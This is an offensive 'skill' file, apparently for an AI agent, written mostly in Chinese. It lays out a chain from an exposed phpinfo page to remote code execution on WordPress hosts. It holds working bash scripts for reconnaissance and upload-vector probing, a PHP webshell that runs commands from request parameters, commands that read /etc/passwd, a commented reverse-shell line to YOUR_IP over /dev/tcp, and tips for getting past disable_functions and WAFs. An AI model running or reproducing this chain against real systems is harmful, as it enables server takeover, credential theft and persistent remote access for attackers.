---
name: phpinfo-to-rce
description: 当 info.php 暴露时，通过 exec 检查将 phpinfo 串联至 RCE。
version: 1.1.1
revision_date: 2026-11-13
license: MIT
platforms: [linux]
compatibility: Requires curl, nmap, python3, masscan, subfinder, httpx, nuclei
metadata:
  tags: [recon, phpinfo, RCE, wordpress, chain]
  category: recon
  related_skills:
    - source-leak-hunt
    - wordpress-full-compromise
    - cross-attack-chains
    - error-log-mining
---

# PHPInfo → RCE 链路技能

评估暴露的 `phpinfo()` 页面以获取配置泄露信息，以及独立执行路径所需的前置条件。若没有获得授权的代码执行或文件执行原语，启用进程函数本身并不会造成 RCE。

## When to Use

- `source-leak-hunt` 标记出暴露了 `info.php` 或 `phpinfo.php` 的目标。
- 在投入精力研究上传向量之前，需要确认 RCE 是否可行。
- 正在构建需要代码执行的攻击链。
- 目标存在文件上传路径（开放注册 + XMLRPC、联系表单、个人头像等）。

## Prerequisites

- 具备 curl 的 `terminal`。
- 已确认暴露的 phpinfo 页面（HTTP 200，且包含 “PHP Version”）。
- 对于 RCE：同一主机上存在文件上传向量（带凭据的 XMLRPC、开放注册、联系表单等）。

## How to Run

```bash
# Step 1: Fetch phpinfo and check for exec restrictions
curl --max-time 30 --connect-timeout 10 -sk "https://TARGET/info.php" | grep -i "disable_functions"

# Step 2: If ONLY pcntl_* is disabled, all exec functions are available
# Step 3: Find upload vector and deliver webshell
```

## 快速参考

| 检查项 | 关注内容 | 影响 |
|-------|-----------------|-------------|
| `disable_functions` | 仅 `pcntl_alarm,pcntl_fork,...` | 所有 exec 可用 — RCE 可行 |
| `disable_functions` | `exec,system,passthru,shell_exec,popen,proc_open` | Exec 被禁用 — 需要绕过 |
| `allow_url_fopen` | On | 可能实现远程文件包含 |
| `allow_url_include` | On | 可直接进行 RFI |
| `open_basedir` | 未设置或 `/var/www:/tmp` | 文件访问范围广 |
| `display_errors` | On | 基于报错的信息泄露 |
| `DOCUMENT_ROOT` | `/var/www/html` 或自定义 | 了解 webshell 写入位置 |
| `SERVER_ADMIN` | 电子邮件地址 | 可用于社工的联系方式 |
| `_SERVER["REMOTE_ADDR"]` | 显示你的 IP（如位于代理之后） | WAF/CDN 检测 |
| PHP 版本 | < 7.4 | 已停止支持（EOL）— 更多未修补的 CVE |

## Procedure

### 步骤 1 — 获取并分析 PHPInfo

```bash
TARGET="$1"

# Full phpinfo dump
curl -sk --max-time 15 --connect-timeout 10 "https://$TARGET/info.php" > /tmp/phpinfo_$TARGET.html
curl -sk --max-time 15 --connect-timeout 10 "https://$TARGET/phpinfo.php" >> /tmp/phpinfo_$TARGET.html 2>/dev/null

# Check if phpinfo is real (not SPA catch-all)
if ! grep -q "PHP Version" /tmp/phpinfo_$TARGET.html; then
  echo "[-] Not a real phpinfo page"
  exit 1
fi

echo "[+] PHPInfo confirmed on $TARGET"
echo ""

# Extract critical directives
echo "=== PHP Version ==="
grep -Eo 'PHP Version <.*?>[^<]+' /tmp/phpinfo_$TARGET.html | head -1

echo ""
echo "=== disable_functions ==="
DISABLED=$(grep -A1 'disable_functions' /tmp/phpinfo_$TARGET.html | grep -Eo '>(local|master).*?<' | sed 's/[<>]//g')
echo "$DISABLED"

echo ""
echo "=== Exec Functions Available? ==="
if echo "$DISABLED" | grep -qE 'exec|system|passthru|shell_exec|popen|proc_open'; then
  echo "[-] Exec functions ARE disabled — RCE blocked via standard methods"
else
  echo "[+] Exec functions NOT disabled — RCE POSSIBLE!"
  echo "[+] Available: exec, system, passthru, shell_exec, popen, proc_open"
fi

echo ""
echo "=== Other Critical Settings ==="
grep -E '(allow_url_fopen|allow_url_include|open_basedir|display_errors|DOCUMENT_ROOT|SERVER_ADMIN|upload_max_filesize|post_max_size)' /tmp/phpinfo_$TARGET.html | \
  sed 's/<[^>]*>//g' | sed 's/\s\+/ /g' | sort -u
```

### 步骤 2 — 评估 RCE 可行性

```bash
# Decision matrix:
# 1. Exec functions NOT disabled → RCE possible with ANY upload vector
# 2. Exec functions disabled → Check for bypass techniques:
#    - LD_PRELOAD bypass (if putenv() not disabled)
#    - FFI bypass (PHP 7.4+ with FFI enabled)
#    - proc_open bypass (sometimes missed in disable_functions)
#    - mail() + sendmail_path abuse

# Quick check for LD_PRELOAD bypass viability
if ! echo "$DISABLED" | grep -q "putenv"; then
  echo "[+] putenv() available — LD_PRELOAD bypass possible"
fi

# Quick check for FFI bypass
if grep -q "FFI" /tmp/phpinfo_$TARGET.html && ! echo "$DISABLED" | grep -q "FFI"; then
  echo "[+] FFI enabled — FFI bypass possible (PHP 7.4+)"
fi
```

### 步骤 3 — 寻找上传向量

```bash
TARGET="$1"

echo "[*] Searching for upload vectors on $TARGET..."

# Check WordPress open registration
REG=$(curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-login.php?action=register" | grep -o 'user_login')
[[ -n "$REG" ]] && echo "[+] Open WP registration — can upload via XMLRPC wp.uploadFile"

# Check XMLRPC with wp.uploadFile
XMLRPC_METHODS=$(curl --max-time 30 --connect-timeout 10 -sk -X POST "https://$TARGET/xmlrpc.php" \
  -H "Content-Type: text/xml" \
  -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName></methodCall>' \
  | grep -o 'wp.uploadFile')
[[ -n "$XMLRPC_METHODS" ]] && echo "[+] XMLRPC wp.uploadFile available"

# Check for contact form file upload
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/contact" | grep -iE 'type=.file|enctype=.multipart' && \
  echo "[+] Contact form with file upload"

# Check Elementor upload (if plugin present)
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/elementor/v1/globals" | grep -q "elementor" && \
  echo "[+] Elementor detected — check for upload endpoints"

# Check Gravity Forms
curl --max-time 30 --connect-timeout 10 -sk "https://$TARGET/wp-json/gf/v2/forms" | grep -q "id" && \
  echo "[+] Gravity Forms detected — check for file upload fields"
```

### 步骤 4 — 投放 Webshell

如果找到上传向量（例如 XMLRPC + 开放注册）：

```bash
TARGET="$1"

# Generate simple PHP webshell
cat > /tmp/ws.php << 'EOF'
<?php
$c = $_REQUEST['c'];
if($c) { system($c); } else { echo "<!-- OK -->"; }
?>
EOF

# If XMLRPC wp.uploadFile is available (see xmlrpc-exploitation skill for full flow):
# 1. Register user via open registration
# 2. Upload webshell via XMLRPC
# 3. Access at /wp-content/uploads/YYYY/MM/ws.php?c=id

echo "[*] Webshell ready at /tmp/ws.php"
echo "[*] Use xmlrpc-exploitation skill for the full upload chain"
echo "[*] Or adapt to the specific upload vector found above"
```

### 步骤 5 — 验证 RCE

```bash
TARGET="$1"
WEBSHELL_URL="$2"  # e.g., https://TARGET/wp-content/uploads/2026/06/ws.php

# Test command execution
curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=id"
curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=uname -a"
curl --max-time 30 --connect-timeout 10 -sk "$WEBSHELL_URL?c=cat /etc/passwd | head -5"

# Establish reverse shell (if outbound connections allowed)
# On your listener: nc -lvnp 4444
# curl -sk "$WEBSHELL_URL?c=bash -c 'bash -i >%26 /dev/tcp/YOUR_IP/4444 0>%261'"
```

## Pitfalls

- **phpinfo 位于 WAF 之后：** Cloudflare 可能缓存 phpinfo 或拦截某些路径。尝试 `/test.php`、`/php_info.php`、`/info.php?1`。
- **disable_functions 绕过较为复杂：** LD_PRELOAD 绕过需要编译与目标架构及 libc 匹配的 .so 文件。FFI 绕过需要 PHP 7.4+ 且 `FFI::cdef()` 不在 disable_functions 中。
- **上传路径发现：** WordPress 将上传文件存储在 `/wp-content/uploads/YYYY/MM/`。部分主机会通过 `UPLOADS` 常量修改该路径（可查看 phpinfo）。
- **Webshell 被 WAF 拦截：** 如果主机部署了 mod_security 或 WAF，访问 PHP webshell 时可能被拦截。尝试其他扩展名（.phtml、.php5、.pht）或混淆后的 payload。

## Verification

- PHPInfo 必须是真实的（包含 “PHP Version” 文本，而非 SPA 的兜底页面）。
- `disable_functions` 分析必须确认至少有一个 exec 函数可用。
- 上传的 webshell 必须返回 `id` 或 `whoami` 的输出，以证明代码执行。
- 记录完整链路：phpinfo → disable_functions 分析 → 上传向量 → webshell → RCE。
